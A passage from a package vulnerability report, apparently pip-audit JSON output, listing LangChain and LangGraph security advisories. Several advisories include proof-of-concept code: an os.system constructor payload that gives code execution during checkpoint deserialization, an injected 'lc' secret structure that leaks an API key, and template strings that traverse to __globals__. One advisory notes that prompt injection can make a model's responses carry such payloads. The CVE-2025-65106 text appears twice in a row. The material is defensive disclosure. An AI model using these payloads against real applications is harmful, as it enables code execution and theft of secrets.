Web Explorer server as a proxy for web attacks on third parties and interact with servers in the local network, including reading their response data. This could potentially lead to arbitrary code execution, depending on the nature of the local services. The vulnerability is limited to GET requests, as POST requests are not possible, but the impact on confidentiality, integrity, and availability is significant due to the potential for stolen credentials and state-changing interactions with internal APIs.  The patched code: * Requires users to opt-in * Suggests using a proxy to prevent requests to local addresses"}, {"id": "GHSA-f2jm-rw3h-6phg", "fix_versions": ["0.2.4"], "aliases": ["CVE-2024-5998"], "description": "A vulnerability in the `FAISS.deserialize_from_bytes` function of langchain-ai/langchain allows for pickle deserialization of untrusted data. This can lead to the execution of arbitrary commands via the `os.system` function. The issue affects versions prior to 0.2.4."}, {"id": "GHSA-pc6w-59fv-rh23", "fix_versions": ["0.3.27"], "aliases": ["CVE-2025-6984"], "description": "The langchain-ai/langchain project, specifically the EverNoteLoader component, is vulnerable to XML External Entity (XXE) attacks due to insecure XML parsing. The vulnerability arises from the use of etree.iterparse() without disabling external entity references, which can lead to sensitive information disclosure. An attacker could exploit this by crafting a malicious XML payload that references local files, potentially exposing sensitive data such as /etc/passwd. This issue has been fixed in 0.3.27 of langchain-community."}]}, {"name": "langchain-core", "version": "0.1.23", "vulns": [{"id": "GHSA-q84m-rmw3-4382", "fix_versions": ["0.1.35"], "aliases": ["CVE-2024-1455"], "description": "The XMLOutputParser in LangChain uses the etree module from the XML parser in the standard python library which has some XML vulnerabilities; see: https://docs.python.org/3/library/xml.html  This primarily affects users that combine an LLM (or agent) with the `XMLOutputParser` and expose the component via an endpoint on a web-service.   This would allow a malicious party to attempt to manipulate the LLM to produce a malicious payload for the parser that would compromise the availability of the service.  A successful attack is predicated on:  1. Usage of XMLOutputParser 2. Passing of malicious input into the XMLOutputParser either directly or by trying to manipulate an LLM to do so on the users behalf 3. Exposing the component via a web-service"}, {"id": "GHSA-5chr-fjjv-38qv", "fix_versions": ["0.1.53", "0.2.43", "0.3.15"], "aliases": ["CVE-2024-10940"], "description": "A vulnerability in langchain-core versions >=0.1.17,<0.1.53, >=0.2.0,<0.2.43, and >=0.3.0,<0.3.15 allows unauthorized users to read arbitrary files from the host file system. The issue arises from the ability to create langchain_core.prompts.ImagePromptTemplate's (and by extension langchain_core.prompts.ChatPromptTemplate's) with input variables that can read any user-specified path from the server file system. If the outputs of these prompt templates are exposed to the user, either directly or through downstream model outputs, it can lead to the exposure of sensitive information."}, {"id": "GHSA-6qv9-48xg-fc7f", "fix_versions": ["0.3.80", "1.0.7"], "aliases": ["CVE-2025-65106"], "description": "## Context  A template injection vulnerability exists in LangChain's prompt template system that allows attackers to access Python object internals through template syntax. This vulnerability affects applications that accept **untrusted template strings** (not just template variables) in `ChatPromptTemplate` and related prompt template classes.  Templates allow attribute access (`.`) and indexing (`[]`) but not method invocation (`()`).  The combination of attribute access and indexing may enable exploitation depending on which objects are passed to templates. When template variables are simple strings (the common case), the impact is limited. However, when using `MessagesPlaceholder` with chat message objects, attackers can traverse through object attributes and dictionary lookups (e.g., `__globals__`) to reach sensitive data such as environment variables.  The vulnerability specifically requires that applications accept **template strings** (the structure) from untrusted sources, not just **template variables** (the data). Most applications either do not use templates or else use hardcoded templates and are not vulnerable.  ## Affected Components  - `langchain-core` package - Template formats:   - F-string templates (`template_format=\"f-string\"`) - **Vulnerability fixed**   - Mustache templates (`template_format=\"mustache\"`) - **Defensive hardening**   - Jinja2 templates (`template_format=\"jinja2\"`) - **Defensive hardening**  ### Impact Attackers who can control template strings (not just template variables) can: - Access Python object attributes and internal properties via attribute traversal - Extract sensitive information from object internals (e.g., `__class__`, `__globals__`) - Potentially escalate to more severe attacks depending on the objects passed to templates  ### Attack Vectors  #### 1. F-string Template Injection **Before Fix:** ```python from langchain_core.prompts import ChatPromptTemplate  malicious_template = ChatPromptTemplate.from_messages(     [(\"human\", \"{msg.__class__.__name__}\")],     template_format=\"f-string\" )  # Note that this requires passing a placeholder variable for \"msg.__class__.__name__\". result = malicious_template.invoke({\"msg\": \"foo\", \"msg.__class__.__name__\": \"safe_placeholder\"}) # Previously returned # >>> result.messages[0].content # >>> 'str' ```  #### 2. Mustache Template Injection **Before Fix:** ```python from langchain_core.prompts import ChatPromptTemplate from langchain_core.messages import HumanMessage  msg = HumanMessage(\"Hello\")  # Attacker controls the template string malicious_template = ChatPromptTemplate.from_messages(     [(\"human\", \"{{question.__class__.__name__}}\")],     template_format=\"mustache\" )  result = malicious_template.invoke({\"question\": msg}) # Previously returned: \"HumanMessage\" (getattr() exposed internals) ```  #### 3. Jinja2 Template Injection **Before Fix:** ```python from langchain_core.prompts import ChatPromptTemplate from langchain_core.messages import HumanMessage  msg = HumanMessage(\"Hello\")  # Attacker controls the template string malicious_template = ChatPromptTemplate.from_messages(     [(\"human\", \"{{question.parse_raw}}\")],     template_format=\"jinja2\" )  result = malicious_template.invoke({\"question\": msg}) # Could access non-dunder attributes/methods on objects ```  ### Root Cause  1. **F-string templates**: The implementation used Python's `string.Formatter().parse()` to extract variable names from template strings. This method returns the complete field expression, including attribute access syntax:      ```python      from string import Formatter       template = \"{msg.__class__} and {x}\"      print([var_name for (_, var_name, _, _) in Formatter().parse(template)])      # Returns: ['msg.__class__', 'x']     ```      The extracted names were not validated to ensure they were simple identifiers. As a result, template strings containing attribute traversal and indexing expressions (e.g., `{obj.__class__.__name__}` or `{obj.method.__globals__[os]}`) were accepted and subsequently evaluated during formatting. While f-string templates do not support method calls with `()`, they do support `[]` indexing, which could allow traversal through dictionaries like `__globals__` to reach sensitive objects. 2. **Mustache templates**: By design, used `getattr()` as a fallback to support accessing attributes on objects (e.g., `{{user.name}}` on a User object). However, we decided to restrict this to simpler primitives that subclass dict, list, and tuple types as defensive hardening, since untrusted templates could exploit attribute access to reach internal properties like class on arbitrary objects 3. **Jinja2 templates**: Jinja2's default `SandboxedEnvironment` blocks dunder attributes (e.g., `__class__`) but permits access to other attributes and methods on objects. While Jinja2 templates in LangChain are typically used with trusted template strings, as a defense-in-depth measure, we've restricted the environment to block all attribute and method access on objects    passed to templates.   ## Who Is Affected?  ### High Risk Scenarios You are affected if your application: - Accepts template strings from untrusted sources (user input, external APIs, databases) - Dynamically constructs prompt templates based on user-provided patterns - Allows users to customize or create prompt templates  **Example vulnerable code:** ```python # User controls the template string itself user_template_string = request.json.get(\"template\")  # DANGEROUS  prompt = ChatPromptTemplate.from_messages(     [(\"human\", user_template_string)],     template_format=\"mustache\" )  result = prompt.invoke({\"data\": sensitive_object}) ```  ### Low/No Risk Scenarios You are **NOT** affected if: - Template strings are hardcoded in your application code - Template strings come only from trusted, controlled sources - Users can only provide **values** for template variables, not the template structure itself  **Example safe code:** ```python # Template is hardcoded - users only control variables prompt = ChatPromptTemplate.from_messages(     [(\"human\", \"User question: {question}\")],  # SAFE     template_format=\"f-string\" )  # User input only fills the 'question' variable result = prompt.invoke({\"question\": user_input}) ```  ## The Fix  ### F-string Templates F-string templates had a clear vulnerability where attribute access syntax was exploitable. We've added strict validation to prevent this:  - Added validation to enforce that variable names must be valid Python identifiers - Rejects syntax like `{obj.attr}`, `{obj[0]}`, or `{obj.__class__}` - Only allows simple variable names: `{variable_name}`  ```python # After fix - these are rejected at template creation time ChatPromptTemplate.from_messages(     [(\"human\", \"{msg.__class__}\")],  # ValueError: Invalid variable name     template_format=\"f-string\" ) ```  ### Mustache Templates (Defensive Hardening) As defensive hardening, we've restricted what Mustache templates support to reduce the attack surface:  - Replaced `getattr()` fallback with strict type checking - Only allows traversal into `dict`, `list`, and `tuple` types - Blocks attribute access on arbitrary Python objects  ```python # After hardening - attribute access returns empty string prompt = ChatPromptTemplate.from_messages(     [(\"human\", \"{{msg.__class__}}\")],     template_format=\"mustache\" ) result = prompt.invoke({\"msg\": HumanMessage(\"test\")}) # Returns: \"\" (access blocked) ```  ### Jinja2 Templates (Defensive Hardening) As defensive hardening, we've significantly restricted Jinja2 template capabilities:  - Introduced `_RestrictedSandboxedEnvironment` that blocks **ALL** attribute/method access - Only allows simple variable lookups from the context dictionary - Raises `SecurityError` on any attribute access attempt  ```python # After hardening - all attribute access is blocked prompt = ChatPromptTemplate.from_messages(     [(\"human\", \"{{msg.content}}\")],     template_format=\"jinja2\" ) # Raises SecurityError: Access to attributes is not allowed ```  **Important Recommendation**: Due to the expressiveness of Jinja2 and the difficulty of fully sandboxing it, **we recommend reserving Jinja2 templates for trusted sources only**. If you need to accept template strings from untrusted users, use f-string or mustache templates with the new restrictions instead.  While we've hardened the Jinja2 implementation, the nature of templating engines makes comprehensive sandboxing challenging. The safest approach is to only use Jinja2 templates when you control the template source.  **Important Reminder**: Many applications do not need prompt templates. Templates are useful for variable substitution and dynamic logic (if statements, loops, conditionals). However, if you're building a chatbot or conversational application, you can often work directly with message objects (e.g., `HumanMessage`, `AIMessage`, `ToolMessage`) without templates. Direct message construction avoids template-related security concerns entirely.  ## Remediation  ### Immediate Actions  1. **Audit your code** for any locations where template strings come from untrusted sources 2. **Update to the patched version** of `langchain-core` 3. **Review template usage** to ensure separation between template structure and user data  ### Best Practices  - **Consider if you need templates at all** - Many applications can work directly with message objects (`HumanMessage`, `AIMessage`, etc.) without templates## Context  A template injection vulnerability exists in LangChain's prompt template system that allows attackers to access Python object internals through template syntax. This vulnerability affects applications that accept **untrusted template strings** (not just template variables) in `ChatPromptTemplate` and related prompt template classes.  Templates allow attribute access (`.`) and indexing (`[]`) but not method invocation (`()`).  The combination of attribute access and indexing may enable exploitation depending on which objects are passed to templates. When template variables are simple strings (the common case), the impact is limited. However, when using `MessagesPlaceholder` with chat message objects, attackers can traverse through object attributes and dictionary lookups (e.g., `__globals__`) to reach sensitive data such as environment variables.  The vulnerability specifically requires that applications accept **template strings** (the structure) from untrusted sources, not just **template variables** (the data). Most applications either do not use templates or else use hardcoded templates and are not vulnerable.  ## Affected Components  - `langchain-core` package - Template formats:   - F-string templates (`template_format=\"f-string\"`) - **Vulnerability fixed**   - Mustache templates (`template_format=\"mustache\"`) - **Defensive hardening**   - Jinja2 templates (`template_format=\"jinja2\"`) - **Defensive hardening**  ### Impact Attackers who can control template strings (not just template variables) can: - Access Python object attributes and internal properties via attribute traversal - Extract sensitive information from object internals (e.g., `__class__`, `__globals__`) - Potentially escalate to more severe attacks depending on the objects passed to templates  ### Attack Vectors  #### 1. F-string Template Injection **Before Fix:** ```python from langchain_core.prompts import ChatPromptTemplate  malicious_template = ChatPromptTemplate.from_messages(     [(\"human\", \"{msg.__class__.__name__}\")],     template_format=\"f-string\" )  # Note that this requires passing a placeholder variable for \"msg.__class__.__name__\". result = malicious_template.invoke({\"msg\": \"foo\", \"msg.__class__.__name__\": \"safe_placeholder\"}) # Previously returned # >>> result.messages[0].content # >>> 'str' ```  #### 2. Mustache Template Injection **Before Fix:** ```python from langchain_core.prompts import ChatPromptTemplate from langchain_core.messages import HumanMessage  msg = HumanMessage(\"Hello\")  # Attacker controls the template string malicious_template = ChatPromptTemplate.from_messages(     [(\"human\", \"{{question.__class__.__name__}}\")],     template_format=\"mustache\" )  result = malicious_template.invoke({\"question\": msg}) # Previously returned: \"HumanMessage\" (getattr() exposed internals) ```  #### 3. Jinja2 Template Injection **Before Fix:** ```python from langchain_core.prompts import ChatPromptTemplate from langchain_core.messages import HumanMessage  msg = HumanMessage(\"Hello\")  # Attacker controls the template string malicious_template = ChatPromptTemplate.from_messages(     [(\"human\", \"{{question.parse_raw}}\")],     template_format=\"jinja2\" )  result = malicious_template.invoke({\"question\": msg}) # Could access non-dunder attributes/methods on objects ```  ### Root Cause  1. **F-string templates**: The implementation used Python's `string.Formatter().parse()` to extract variable names from template strings. This method returns the complete field expression, including attribute access syntax:      ```python      from string import Formatter       template = \"{msg.__class__} and {x}\"      print([var_name for (_, var_name, _, _) in Formatter().parse(template)])      # Returns: ['msg.__class__', 'x']     ```      The extracted names were not validated to ensure they were simple identifiers. As a result, template strings containing attribute traversal and indexing expressions (e.g., `{obj.__class__.__name__}` or `{obj.method.__globals__[os]}`) were accepted and subsequently evaluated during formatting. While f-string templates do not support method calls with `()`, they do support `[]` indexing, which could allow traversal through dictionaries like `__globals__` to reach sensitive objects. 2. **Mustache templates**: By design, used `getattr()` as a fallback to support accessing attributes on objects (e.g., `{{user.name}}` on a User object). However, we decided to restrict this to simpler primitives that subclass dict, list, and tuple types as defensive hardening, since untrusted templates could exploit attribute access to reach internal properties like class on arbitrary objects 3. **Jinja2 templates**: Jinja2's default `SandboxedEnvironment` blocks dunder attributes (e.g., `__class__`) but permits access to other attributes and methods on objects. While Jinja2 templates in LangChain are typically used with trusted template strings, as a defense-in-depth measure, we've restricted the environment to block all attribute and method access on objects    passed to templates.   ## Who Is Affected?  ### High Risk Scenarios You are affected if your application: - Accepts template strings from untrusted sources (user input, external APIs, databases) - Dynamically constructs prompt templates based on user-provided patterns - Allows users to customize or create prompt templates  **Example vulnerable code:** ```python # User controls the template string itself user_template_string = request.json.get(\"template\")  # DANGEROUS  prompt = ChatPromptTemplate.from_messages(     [(\"human\", user_template_string)],     template_format=\"mustache\" )  result = prompt.invoke({\"data\": sensitive_object}) ```  ### Low/No Risk Scenarios You are **NOT** affected if: - Template strings are hardcoded in your application code - Template strings come only from trusted, controlled sources - Users can only provide **values** for template variables, not the template structure itself  **Example safe code:** ```python # Template is hardcoded - users only control variables prompt = ChatPromptTemplate.from_messages(     [(\"human\", \"User question: {question}\")],  # SAFE     template_format=\"f-string\" )  # User input only fills the 'question' variable result = prompt.invoke({\"question\": user_input}) ```  ## The Fix  ### F-string Templates F-string templates had a clear vulnerability where attribute access syntax was exploitable. We've added strict validation to prevent this:  - Added validation to enforce that variable names must be valid Python identifiers - Rejects syntax like `{obj.attr}`, `{obj[0]}`, or `{obj.__class__}` - Only allows simple variable names: `{variable_name}`  ```python # After fix - these are rejected at template creation time ChatPromptTemplate.from_messages(     [(\"human\", \"{msg.__class__}\")],  # ValueError: Invalid variable name     template_format=\"f-string\" ) ```  ### Mustache Templates (Defensive Hardening) As defensive hardening, we've restricted what Mustache templates support to reduce the attack surface:  - Replaced `getattr()` fallback with strict type checking - Only allows traversal into `dict`, `list`, and `tuple` types - Blocks attribute access on arbitrary Python objects  ```python # After hardening - attribute access returns empty string prompt = ChatPromptTemplate.from_messages(     [(\"human\", \"{{msg.__class__}}\")],     template_format=\"mustache\" ) result = prompt.invoke({\"msg\": HumanMessage(\"test\")}) # Returns: \"\" (access blocked) ```  ### Jinja2 Templates (Defensive Hardening) As defensive hardening, we've significantly restricted Jinja2 template capabilities:  - Introduced `_RestrictedSandboxedEnvironment` that blocks **ALL** attribute/method access - Only allows simple variable lookups from the context dictionary - Raises `SecurityError` on any attribute access attempt  ```python # After hardening - all attribute access is blocked prompt = ChatPromptTemplate.from_messages(     [(\"human\", \"{{msg.content}}\")],     template_format=\"jinja2\" ) # Raises SecurityError: Access to attributes is not allowed ```  **Important Recommendation**: Due to the expressiveness of Jinja2 and the difficulty of fully sandboxing it, **we recommend reserving Jinja2 templates for trusted sources only**. If you need to accept template strings from untrusted users, use f-string or mustache templates with the new restrictions instead.  While we've hardened the Jinja2 implementation, the nature of templating engines makes comprehensive sandboxing challenging. The safest approach is to only use Jinja2 templates when you control the template source.  **Important Reminder**: Many applications do not need prompt templates. Templates are useful for variable substitution and dynamic logic (if statements, loops, conditionals). However, if you're building a chatbot or conversational application, you can often work directly with message objects (e.g., `HumanMessage`, `AIMessage`, `ToolMessage`) without templates. Direct message construction avoids template-related security concerns entirely.  ## Remediation  ### Immediate Actions  1. **Audit your code** for any locations where template strings come from untrusted sources 2. **Update to the patched version** of `langchain-core` 3. **Review template usage** to ensure separation between template structure and user data  ### Best Practices  - **Consider if you need templates at all** - Many applications can work directly with message objects (`HumanMessage`, `AIMessage`, etc.) without templates - **Reserve Jinja2 for trusted sources** - Only use Jinja2 templates when you fully control the template content  ## Update: Jinja2 Restrictions Reverted  The Jinja2 hardening introduced in the initial patch has been **reverted as of `langchain-core` 1.1.3**. The restriction was not addressing a direct vulnerability but was part of broader defensive hardening. In practice, it significantly limited legitimate Jinja2 usage and broke existing templates. Since Jinja2 is intended to be used only with **trusted template sources**, the original behavior has been restored. Users should continue to avoid accepting untrusted template strings when using Jinja2, but no security issue exists with trusted templates."}, {"id": "GHSA-c67j-w6g6-q2cm", "fix_versions": ["0.3.81", "1.2.5"], "aliases": ["CVE-2025-68664"], "description": "## Summary  A serialization injection vulnerability exists in LangChain's `dumps()` and `dumpd()` functions. The functions do not escape dictionaries with `'lc'` keys when serializing free-form dictionaries. The `'lc'` key is used internally by LangChain to mark serialized objects. When user-controlled data contains this key structure, it is treated as a legitimate LangChain object during deserialization rather than plain user data.  ### Attack surface  The core vulnerability was in `dumps()` and `dumpd()`: these functions failed to escape user-controlled dictionaries containing `'lc'` keys. When this unescaped data was later deserialized via `load()` or `loads()`, the injected structures were treated as legitimate LangChain objects rather than plain user data.  This escaping bug enabled several attack vectors:  1. **Injection via user data**: Malicious LangChain object structures could be injected through user-controlled fields like `metadata`, `additional_kwargs`, or `response_metadata` 2. **Class instantiation within trusted namespaces**: Injected manifests could instantiate any `Serializable` subclass, but only within the pre-approved trusted namespaces (`langchain_core`, `langchain`, `langchain_community`). This includes classes with side effects in `__init__` (network calls, file operations, etc.). Note that namespace validation was already enforced before this patch, so arbitrary classes outside these trusted namespaces could not be instantiated.  ### Security hardening  This patch fixes the escaping bug in `dumps()` and `dumpd()` and introduces new restrictive defaults in `load()` and `loads()`: allowlist enforcement via `allowed_objects=\"core\"` (restricted to [serialization mappings](https://github.com/langchain-ai/langchain/blob/master/libs/core/langchain_core/load/mapping.py)), `secrets_from_env` changed from `True` to `False`, and default Jinja2 template blocking via `init_validator`. These are breaking changes for some use cases.  ## Who is affected?  Applications are vulnerable if they:  1. **Use `astream_events(version=\"v1\")`** \u2014 The v1 implementation internally uses vulnerable serialization. Note: `astream_events(version=\"v2\")` is not vulnerable. 2. **Use `Runnable.astream_log()`** \u2014 This method internally uses vulnerable serialization for streaming outputs. 3. **Call `dumps()` or `dumpd()` on untrusted data, then deserialize with `load()` or `loads()`** \u2014 Trusting your own serialization output makes you vulnerable if user-controlled data (e.g., from LLM responses, metadata fields, or user inputs) contains `'lc'` key structures. 4. **Deserialize untrusted data with `load()` or `loads()`** \u2014 Directly deserializing untrusted data that may contain injected `'lc'` structures. 5. **Use `RunnableWithMessageHistory`** \u2014 Internal serialization in message history handling. 6. **Use `InMemoryVectorStore.load()`** to deserialize untrusted documents. 7. Load untrusted generations from cache using **`langchain-community` caches**. 8. Load untrusted manifests from the LangChain Hub via **`hub.pull`**. 9. Use **`StringRunEvaluatorChain`** on untrusted runs. 10. Use **`create_lc_store`** or **`create_kv_docstore`** with untrusted documents. 11. Use **`MultiVectorRetriever`** with byte stores containing untrusted documents. 12. Use **`LangSmithRunChatLoader`** with runs containing untrusted messages.  The most common attack vector is through **LLM response fields** like `additional_kwargs` or `response_metadata`, which can be controlled via prompt injection and then serialized/deserialized in streaming operations.  ## Impact  Attackers who control serialized data can extract environment variable secrets by injecting `{\"lc\": 1, \"type\": \"secret\", \"id\": [\"ENV_VAR\"]}` to load environment variables during deserialization (when `secrets_from_env=True`, which was the old default). They can also instantiate classes with controlled parameters by injecting constructor structures to instantiate any class within trusted namespaces with attacker-controlled parameters, potentially triggering side effects such as network calls or file operations.  Key severity factors:  - Affects the serialization path - applications trusting their own serialization output are vulnerable - Enables secret extraction when combined with `secrets_from_env=True` (the old default) - LLM responses in `additional_kwargs` can be controlled via prompt injection  ## Exploit example  ```python from langchain_core.load import dumps, load import os  # Attacker injects secret structure into user-controlled data attacker_dict = {     \"user_data\": {         \"lc\": 1,         \"type\": \"secret\",         \"id\": [\"OPENAI_API_KEY\"]     } }  serialized = dumps(attacker_dict)  # Bug: does NOT escape the 'lc' key  os.environ[\"OPENAI_API_KEY\"] = \"sk-secret-key-12345\" deserialized = load(serialized, secrets_from_env=True)  print(deserialized[\"user_data\"])  # \"sk-secret-key-12345\" - SECRET LEAKED!  ```  ## Security hardening changes (breaking changes)  This patch introduces three breaking changes to `load()` and `loads()`:  1. **New `allowed_objects` parameter** (defaults to `'core'`): Enforces allowlist of classes that can be deserialized. The `'all'` option corresponds to the list of objects [specified in `mappings.py`](https://github.com/langchain-ai/langchain/blob/master/libs/core/langchain_core/load/mapping.py) while the `'core'` option limits to objects within `langchain_core`. We recommend that users explicitly specify which objects they want to allow for serialization/deserialization. 2. **`secrets_from_env` default changed from `True` to `False`**: Disables automatic secret loading from environment 3. **New `init_validator` parameter** (defaults to `default_init_validator`): Blocks Jinja2 templates by default  ## Migration guide  ### No changes needed for most users  If you're deserializing standard LangChain types (messages, documents, prompts, trusted partner integrations like `ChatOpenAI`, `ChatAnthropic`, etc.), your code will work without changes:  ```python from langchain_core.load import load  # Uses default allowlist from serialization mappings obj = load(serialized_data)  ```  ### For custom classes  If you're deserializing custom classes not in the serialization mappings, add them to the allowlist:  ```python from langchain_core.load import load from my_package import MyCustomClass  # Specify the classes you need obj = load(serialized_data, allowed_objects=[MyCustomClass]) ```  ### For Jinja2 templates  Jinja2 templates are now blocked by default because they can execute arbitrary code. If you need Jinja2 templates, pass `init_validator=None`:  ```python from langchain_core.load import load from langchain_core.prompts import PromptTemplate  obj = load(     serialized_data,     allowed_objects=[PromptTemplate],     init_validator=None )  ```  > [!WARNING] > Only disable `init_validator` if you trust the serialized data. Jinja2 templates can execute arbitrary Python code.  ### For secrets from environment  `secrets_from_env` now defaults to `False`. If you need to load secrets from environment variables:  ```python from langchain_core.load import load  obj = load(serialized_data, secrets_from_env=True) ```   ## Credits  * Dumps bug was reported by @yardenporat * Changes for security hardening due to findings from @0xn3va and @VladimirEliTokarev"}]}, {"name": "langchain-openai", "version": "0.0.2.post1", "vulns": []}, {"name": "langchain-text-splitters", "version": "0.3.11", "vulns": []}, {"name": "langgraph", "version": "0.5.4", "vulns": []}, {"name": "langgraph-checkpoint", "version": "2.1.2", "vulns": [{"id": "GHSA-wwqv-p2pp-99h5", "fix_versions": ["3.0.0"], "aliases": ["CVE-2025-64439"], "description": "# Summary  Prior to `langgraph-checkpoint` version `3.0` , LangGraph\u2019s `JsonPlusSerializer` (used as the default serialization protocol for all checkpointing) contains a remote code execution (RCE) vulnerability when deserializing payloads saved in the `\"json\"` serialization mode.  If an attacker can cause your application to persist a payload serialized in this mode, they may be able to also send malicious content that executes arbitrary Python code during deserialization.  Upgrading to version langgraph-checkpoint `3.0` patches this vulnerability by preventing deserialization of custom objects saved in this mode.  If you are deploying in `langgraph-api`, any version `0.5` or later is also free of this vulnerability.   # Details  **Affected file / component**  [jsonplus.py](https://github.com/langchain-ai/langgraph/blob/c5744f583b11745cd406f3059903e17bbcdcc8ac/libs/checkpoint/langgraph/checkpoint/serde/jsonplus.py)  By default, the serializer attempts to use `\"msgpack\"` for serialization. However, prior to version `3.0` of the checkpointer library, if illegal Unicode surrogate values caused serialization to fail,  it would fall back to using the `\"json\"` mode.  When operating in this mode, the deserializer supports a constructor-style format (`lc == 2`, `type == \"constructor\"`) for custom objects to allow them to be reconstructed at load time.  If an attacker is able to trigger this mode with a malicious payload, deserializing  allow the attacker to execute arbitrary functions upon load.  ---  # Who is affected  This issue affects all users of `langgraph-checkpoint` **versions earlier than 3.0** who:  1. Allow untrusted or user-supplied data to be persisted into checkpoints, and 2. Use the default serializer (or explicitly instantiate `JsonPlusSerializer`) that may fall back to `\"json\"` mode.  If your application only processes trusted data or does not allow untrusted checkpoint writes, the practical risk is reduced.  # Proof of Concept (PoC)  ```python from langgraph.graph import StateGraph  from typing import TypedDict from langgraph.checkpoint.sqlite import SqliteSaver  class State(TypedDict):     foo: str     attack: dict  def my_node(state: State):     return {\"foo\": \"oops i fetched a surrogate \\ud800\"}  with SqliteSaver.from_conn_string(\"foo.db\") as saver:     graph = ( \t    StateGraph(State). \t    add_node(\"my_node\", my_node). \t    add_edge(\"__start__\", \"my_node\"). \t    compile(checkpointer=saver) \t )           attack = {         \"lc\": 2,         \"type\": \"constructor\",         \"id\": [\"os\", \"system\"],         \"kwargs\": {\"command\": \"echo pwnd you > /tmp/pwnd.txt\"},     }     malicious_payload = {          \"attack\": attack,     }      thread_id = \"00000000-0000-0000-0000-000000000001\"     config = {\"thread_id\": thread_id}     # Malicious payload is saved in the first call     graph.invoke(malicious_payload, config=config)      # Malicious payload is deserialized and code is executed in the second call     graph.invoke({\"foo\": \"hi there\"}, config=config)  ```  Running this PoC writes a file `/tmp/pwnd.txt` to disk, demonstrating code execution.  Internally, this exploits the following code path:  ```python from langgraph.checkpoint.serde.jsonplus import JsonPlusSerializer  serializer = JsonPlusSerializer() # Used within the checkpointer  serialized = serializer.dumps_typed(malicious_payload) serializer.loads_typed(serialized)  # Executes os.system(...)  ```  ---  # Fixed Version  The vulnerability is fixed in **`langgraph-checkpoint==3.0.0`**  Release link: https://github.com/langchain-ai/langgraph/releases/tag/checkpoint%3D%3D3.0.0  ---  # Fix Description  The fix introduces an **allow-list** for constructor deserialization, restricting permissible `\"id\"` paths to explicitly approved module/class combinations provided at serializer construction.  Additionally, saving payloads in `\"json\"` format has been deprecated to remove this unsafe fallback path.  ---  # Mitigation  Upgrade immediately to `langgraph-checkpoint==3.0.0`.  This version is fully compatible with `langgraph>=0.3` and does **not** require any import changes or code modifications.  In `langgraph-api`, updating to `0.5` or later will automatically require the patched version of the checkpointer library."}]}, {"name": "langgraph-prebuilt", "version": "0.5.2", "vulns": []}, {"name": "langgraph-sdk", "version": "0.1.74", "vulns": []}, {"name": "langsmith", "version": "0.0.87", "vulns": []}, {"name": "lark", "version": "1.3.1", "vulns": []}, {"name": "levenshtein", "version": "0.27.1", "vulns": []}, {"name": "librt", "version": "0.7.4", "vulns": []}, {"name": "libsast", "version": "3.1.6", "vulns": []}, {"name": "license-expression", "version": "30.4.4", "vulns": []}, {"name": "litellm", "version": "1.68.0", "vulns": []}, {"name": "llvmlite", "version": "0.43.0", "vulns": []}, {"name": "locust", "version": "2.34.0", "vulns": []}, {"name": "loguru", "version": "0.7.3", "vulns": []}, {"name": "lxml", "version": "6.0.2", "vulns": []}, {"name": "mac-cleanup", "version": "2.2.5", "vulns": []}, {"name": "macholib", "version": "1.15.2", "vulns": []}, {"name": "markdown", "version": "3.9", "vulns": []}, {"name": "markdown-it-py", "version": "3.0.0", "vulns": []}, {"name": "markupsafe", "version": "3.0.2", "vulns": []}, {"name": "marshmallow", "version": "3.26.2", "vulns": []}, {"name": "matplotlib", "version": "3.9.4", "vulns": []}, {"name": "matplotlib-inline", "version": "0.2.1", "vulns": []}, {"name": "mccabe", "version": "0.7.0", "vulns": []}, {"name": "mdurl", "version": "0.1.2", "vulns": []}, {"name": "memory-profiler", "version": "0.61.0", "vulns": []}, {"name": "mixpanel", "version": "4.10.1", "vulns": []}, {"name": "mobsfscan", "version": "0.4.5", "vulns": []}, {"name": "motor", "version": "3.7.1", "vulns": []}, {"name": "mpmath", "version": "1.3.0", "vulns": []}, {"name": "msgpack", "version": "1.1.2", "vulns": []}, {"name": "multidict", "version": "6.4.3", "vulns": []}, {"name": "multivolumefile", "version": "0.2.3", "vulns": []}, {"name": "mypy", "version": "1.19.1", "vulns": []}, {"name": "mypy-extensions", "version": "1.1.0", "vulns": []}, {"name": "nest-asyncio", "version": "1.6.0", "vulns": []}, {"name": "networkx", "version": "2.6.3", "vulns": []}, {"name": "nltk", "version": "3.9.2", "vulns": []}, {"name": "nodeenv", "version": "1.9.1", "vulns": []}, {"name": "numba", "version": "0.60.0", "vulns": []}, {"name": "numpy", "version": "1.26.4", "vulns": []}, {"name": "oauthlib", "version": "3.3.1", "vulns": []}, {"name": "open-interpreter", "version": "0.4.3", "vulns": []}, {"name": "openai", "version": "1.109.1", "vulns": []}, {"name": "openpyxl", "version": "3.1.5", "vulns": []}, {"name": "opentelemetry-api", "version": "1.39.1", "vulns": []}, {"name": "opentelemetry-exporter-otlp-proto-common", "version": "1.39.1", "vulns": []}, {"name": "opentelemetry-exporter-otlp-proto-http", "version": "1.39.1", "vulns": []}, {"name": "opentelemetry-instrumentation", "version": "0.60b1", "vulns": []}, {"name": "opentelemetry-instrumentation-asgi", "version": "0.60b1", "vulns": []}, {"name": "opentelemetry-instrumentation-fastapi", "version": "0.60b1", "vulns": []}, {"name": "opentelemetry-instrumentation-logging", "version": "0.60b1", "vulns": []}, {"name": "opentelemetry-instrumentation-pymongo", "version": "0.60b1", "vulns": []}, {"name": "opentelemetry-instrumentation-requests", "version": "0.60b1", "vulns": []}, {"name": "opentelemetry-proto", "version": "1.39.1", "vulns": []}, {"name": "opentelemetry-sdk", "version": "1.39.1", "vulns": []}, {"name": "opentelemetry-semantic-conventions", "version": "0.60b1", "vulns": []}, {"name": "opentelemetry-util-http", "version": "0.60b1", "vulns": []}, {"name": "orjson", "version": "3.11.5", "vulns": []}, {"name": "ormsgpack", "version": "1.11.0", "vulns": []}, {"name": "outcome", "version": "1.3.0.post0", "vulns": []}, {"name": "packageurl-python", "version": "0.13.4", "vulns": []}, {"name": "packaging", "version": "23.2", "vulns": []}, {"name": "pandas", "version": "2.3.3", "vulns": []}, {"name": "parso", "version": "0.8.5", "vulns": []}, {"name": "partialjson", "version": "0.0.8", "vulns": []}, {"name": "passlib", "version": "1.7.4", "vulns": []}, {"name": "pathspec", "version": "0.12.1", "vulns": []}, {"name": "pbr", "version": "7.0.3", "vulns": []}, {"name": "peewee", "version": "3.18.3", "vulns": []}, {"name": "pexpect", "version": "4.9.0", "vulns": []}, {"name": "pillow", "version": "11.3.0", "vulns": []}, {"name": "pip", "version": "25.1.1", "vulns": [{"id": "GHSA-4xh5-x5gv-qwph", "fix_versions": ["25.3"], "aliases": ["CVE-2025-8869"], "description": "When extracting a tar archive pip may not check symbolic links point into the extraction 